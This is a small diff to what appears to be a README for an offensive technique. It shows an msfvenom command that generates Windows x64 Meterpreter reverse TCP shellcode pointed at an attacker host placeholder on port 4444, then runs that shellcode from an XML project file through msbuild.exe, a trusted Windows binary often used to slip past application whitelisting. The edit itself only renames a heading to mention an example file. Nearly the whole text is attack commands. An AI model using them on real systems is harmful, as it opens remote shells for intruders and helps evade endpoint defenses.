@@ -7,7 +7,8 @@
 
 `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=x.x.x.x lport=4444 -f csharp`
 
-### change shellcode in xml file
+### change shellcode in xml file (Example："executes x64 shellcode.xml")
+
 `C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe shellcode_x64.xml`
 
 
